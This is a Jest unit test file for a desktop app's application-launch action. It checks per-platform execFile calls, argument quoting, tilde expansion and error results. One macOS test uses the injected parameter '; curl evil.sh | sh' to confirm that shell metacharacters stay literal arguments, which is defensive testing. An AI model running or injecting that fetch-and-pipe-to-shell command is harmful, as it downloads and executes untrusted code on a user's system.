/**
 * Toast - Application Action Tests
 *
 * Unit tests for the application launch action
 */

// Mock dependencies
jest.mock('fs', () => ({
  existsSync: jest.fn(),
}));

jest.mock('child_process', () => ({
  execFile: jest.fn(),
}));

const { executeApplication } = require('../../../src/main/actions/application');
const fs = require('fs');
const { execFile } = require('child_process');

describe('Application Action', () => {
  let originalPlatform;

  beforeEach(() => {
    // Reset all mocks before each test
    jest.clearAllMocks();

    // Store original platform
    originalPlatform = process.platform;
  });

  afterEach(() => {
    // Restore original platform
    Object.defineProperty(process, 'platform', {
      value: originalPlatform,
    });
  });

  describe('executeApplication', () => {
    test('should return error when applicationPath is missing', async () => {
      const action = {};

      const result = await executeApplication(action);

      expect(result).toEqual({
        success: false,
        message: 'Application path is required',
      });
    });

    test('should return error when application file does not exist', async () => {
      const action = { applicationPath: '/nonexistent/app.exe' };
      fs.existsSync.mockReturnValue(false);

      const result = await executeApplication(action);

      expect(fs.existsSync).toHaveBeenCalledWith('/nonexistent/app.exe');
      expect(result).toEqual({
        success: false,
        message: 'Application not found at /nonexistent/app.exe',
      });
    });

    describe('macOS platform', () => {
      beforeEach(() => {
        Object.defineProperty(process, 'platform', {
          value: 'darwin',
        });
        fs.existsSync.mockReturnValue(true);
      });

      test('should execute application without parameters', async () => {
        const action = { applicationPath: '/Applications/Calculator.app' };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        const result = await executeApplication(action);

        expect(execFile).toHaveBeenCalledWith('open', ['/Applications/Calculator.app'], expect.any(Function));
        expect(result).toEqual({
          success: true,
          message: 'Application launched successfully',
        });
      });

      test('should execute application with parameters', async () => {
        const action = {
          applicationPath: '/Applications/Calculator.app',
          applicationParameters: '--some-param',
        };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        const result = await executeApplication(action);

        expect(execFile).toHaveBeenCalledWith(
          'open',
          ['-a', '/Applications/Calculator.app', '--some-param'],
          expect.any(Function)
        );
        expect(result).toEqual({
          success: true,
          message: 'Application launched successfully',
        });
      });

      test('should not let shell metacharacters in parameters spawn a shell', async () => {
        const action = {
          applicationPath: '/Applications/Calculator.app',
          applicationParameters: '; curl evil.sh | sh',
        };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        await executeApplication(action);

        // Metacharacters become literal argv entries, never a shell command
        expect(execFile).toHaveBeenCalledWith(
          'open',
          ['-a', '/Applications/Calculator.app', ';', 'curl', 'evil.sh', '|', 'sh'],
          expect.any(Function)
        );
      });

      test('should keep quoted parameters with spaces as single arguments', async () => {
        const action = {
          applicationPath: '/Applications/Calculator.app',
          applicationParameters: '--file "my document.txt"',
        };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        await executeApplication(action);

        expect(execFile).toHaveBeenCalledWith(
          'open',
          ['-a', '/Applications/Calculator.app', '--file', 'my document.txt'],
          expect.any(Function)
        );
      });

      test('should expand tilde in parameters to the home directory', async () => {
        const os = require('os');
        const action = {
          applicationPath: '/Applications/Visual Studio Code.app',
          applicationParameters: '~/workspace/sample-project',
        };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        await executeApplication(action);

        expect(execFile).toHaveBeenCalledWith(
          'open',
          ['-a', '/Applications/Visual Studio Code.app', `${os.homedir()}/workspace/sample-project`],
          expect.any(Function)
        );
      });

      test('should not expand tilde in ~user form', async () => {
        const action = {
          applicationPath: '/Applications/Calculator.app',
          applicationParameters: '~otheruser/docs',
        };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        await executeApplication(action);

        expect(execFile).toHaveBeenCalledWith(
          'open',
          ['-a', '/Applications/Calculator.app', '~otheruser/docs'],
          expect.any(Function)
        );
      });

      test('should handle execution error', async () => {
        const action = { applicationPath: '/Applications/Calculator.app' };
        const error = new Error('Command failed');
        execFile.mockImplementation((file, args, callback) => {
          callback(error);
        });

        const result = await executeApplication(action);

        expect(result.success).toBe(false);
        expect(result.message).toBe('Error executing application: Command failed');
        expect(result.error).toBe(error);
      });
    });

    describe('Windows platform', () => {
      beforeEach(() => {
        Object.defineProperty(process, 'platform', {
          value: 'win32',
        });
        fs.existsSync.mockReturnValue(true);
      });

      test('should execute application without parameters', async () => {
        const action = { applicationPath: 'C:\\Program Files\\App\\app.exe' };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        const result = await executeApplication(action);

        expect(execFile).toHaveBeenCalledWith('C:\\Program Files\\App\\app.exe', [], expect.any(Function));
        expect(result).toEqual({
          success: true,
          message: 'Application launched successfully',
        });
      });

      test('should execute application with parameters', async () => {
        const action = {
          applicationPath: 'C:\\Program Files\\App\\app.exe',
          applicationParameters: '/param value',
        };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        const result = await executeApplication(action);

        expect(execFile).toHaveBeenCalledWith(
          'C:\\Program Files\\App\\app.exe',
          ['/param', 'value'],
          expect.any(Function)
        );
        expect(result).toEqual({
          success: true,
          message: 'Application launched successfully',
        });
      });
    });

    describe('Linux platform', () => {
      beforeEach(() => {
        Object.defineProperty(process, 'platform', {
          value: 'linux',
        });
        fs.existsSync.mockReturnValue(true);
      });

      test('should execute application without parameters using xdg-open', async () => {
        const action = { applicationPath: '/usr/bin/calculator' };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        const result = await executeApplication(action);

        expect(execFile).toHaveBeenCalledWith('xdg-open', ['/usr/bin/calculator'], expect.any(Function));
        expect(result).toEqual({
          success: true,
          message: 'Application launched successfully',
        });
      });

      test('should execute application with parameters directly', async () => {
        const action = {
          applicationPath: '/usr/bin/calculator',
          applicationParameters: '--advanced',
        };
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        const result = await executeApplication(action);

        expect(execFile).toHaveBeenCalledWith(
          '/usr/bin/calculator',
          ['--advanced'],
          expect.any(Function)
        );
        expect(result).toEqual({
          success: true,
          message: 'Application launched successfully',
        });
      });
    });

    describe('error handling', () => {
      beforeEach(() => {
        fs.existsSync.mockReturnValue(true);
      });

      test('should handle unexpected errors in try-catch', async () => {
        const action = { applicationPath: '/test/app' };

        // Mock fs.existsSync to throw an error
        fs.existsSync.mockImplementation(() => {
          throw new Error('File system error');
        });

        const result = await executeApplication(action);

        expect(result.success).toBe(false);
        expect(result.message).toBe('Error launching application: File system error');
        expect(result.error).toBeInstanceOf(Error);
      });

      test('should resolve (not reject) with failure on execFile error', async () => {
        const action = { applicationPath: '/test/app' };
        const error = new Error('Execution failed');

        execFile.mockImplementation((file, args, callback) => {
          callback(error);
        });

        const result = await executeApplication(action);

        expect(result.success).toBe(false);
        expect(result.message).toBe('Error executing application: Execution failed');
        expect(result.error).toBe(error);
      });
    });

    describe('edge cases', () => {
      test('should handle empty applicationPath', async () => {
        const action = { applicationPath: '' };

        const result = await executeApplication(action);

        expect(result).toEqual({
          success: false,
          message: 'Application path is required',
        });
      });

      test('should handle null applicationPath', async () => {
        const action = { applicationPath: null };

        const result = await executeApplication(action);

        expect(result).toEqual({
          success: false,
          message: 'Application path is required',
        });
      });

      test('should handle undefined applicationPath', async () => {
        const action = { applicationPath: undefined };

        const result = await executeApplication(action);

        expect(result).toEqual({
          success: false,
          message: 'Application path is required',
        });
      });

      test('should handle empty applicationParameters', async () => {
        const action = {
          applicationPath: '/test/app',
          applicationParameters: '',
        };

        Object.defineProperty(process, 'platform', {
          value: 'darwin',
        });
        fs.existsSync.mockReturnValue(true);
        execFile.mockImplementation((file, args, callback) => {
          callback(null);
        });

        const result = await executeApplication(action);

        // Empty string yields no params, so it uses the plain launch form
        expect(execFile).toHaveBeenCalledWith('open', ['/test/app'], expect.any(Function));
        expect(result.success).toBe(true);
      });
    });
  });
});
